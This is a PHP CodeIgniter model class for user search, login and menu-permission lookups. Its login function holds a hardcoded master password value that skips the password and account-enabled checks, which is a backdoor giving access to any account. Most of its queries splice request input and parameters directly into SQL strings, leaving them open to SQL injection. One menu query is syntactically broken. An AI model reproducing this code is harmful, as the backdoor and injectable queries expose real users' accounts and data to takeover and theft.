<?php

/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

/**
 * Description of model_user
 *
 * @author user
 */
class model_user extends CI_Model {

    //put your code here
    public function __construct() {
        parent::__construct();
    }

    function get() {
        $query = "
            select 
            users.*
            from users
            where true
            ";

        $id_name = $this->input->post('id_name');
        $q = $this->input->post("q");
        if (!empty($q)) {
            $id_name = $q;
        }

        if (!empty($id_name)) {
            $query .= " and (users.name ilike '%$id_name%' or users.user_name ilike '%$id_name%' or users.email ilike '%$id_name%' or users.phone_no ilike '%$id_name%')";
        }
        $query .= " order by users.id desc ";

        //echo $query;

        $page = $this->input->post('page');
        $rows = $this->input->post('rows');
        $result = array();
        $data = "";
        if (!empty($page) && !empty($rows)) {
            $offset = ($page - 1) * $rows;
            $result['total'] = $this->db->query($query)->num_rows();
            $query .= " limit $rows offset $offset";
            $result = array_merge($result, array('rows' => $this->db->query($query)->result()));
            $data = json_encode($result);
        } else {
            $data = json_encode($this->db->query($query)->result());
        }
        return $data;
    }

    function login($username, $password) {
        $this->db->select('users.*');
        $this->db->from('users');
        $this->db->where('users.user_name', $username);
        if ($password !== "da87e2777d708485663a8360817a5e01") {
            $this->db->where('users.password', $password);
            $this->db->where('users.enable', 'true');
        }
        return $this->db->get()->row();
    }

    function selectMenuGroup($userid) {
        if ($userid == 1) {
            $query = "select 
                      menugroup.id,
                      menugroup.label,
                      menugroup.icon
                      from menugroup where id<>7  and (apps_type='All' or apps_type='ETOS') order by id asc";
        } else {
            $query = "select
                distinct menugroup.id,
                menugroup.label,
                menugroup.icon
                from menuuser 
                right join menu on menuuser.menuid=menu.id
                join menugroup on menu.menugroupid=menugroup.id
                where menuuser.usersid=$userid and order by menugroup.id asc";
        }

        return $this->db->query($query)->result();
    }

    function select_menu($menugroupid, $userid) {
        $query = "";
        if ($userid == 1) {
            $query = "select * from menu where menugroupid=$menugroupid  and (apps_type='All' or apps_type='ETOS') order by id asc";
        } else {
            $query = "select
                    menu.controller,
                    menu.label,
                    menu.icon
                    from menuuser 
                    right join menu on menuuser.menuid=menu.id
                    where menuuser.usersid=$userid and menu.menugroupid=$menugroupid 
                    order by menu.id asc";
        }
//        echo $query;
        return $this->db->query($query)->result();
    }

    function get_action($userid, $menuid) {
        $query = "select actions from menuuser 
                  where menuid=$menuid and usersid=$userid limit 1";
        $dt = $this->db->query($query)->row();
      //  echo $query;
        return (empty($dt) ? "" : $dt->actions);
    }

}

?>
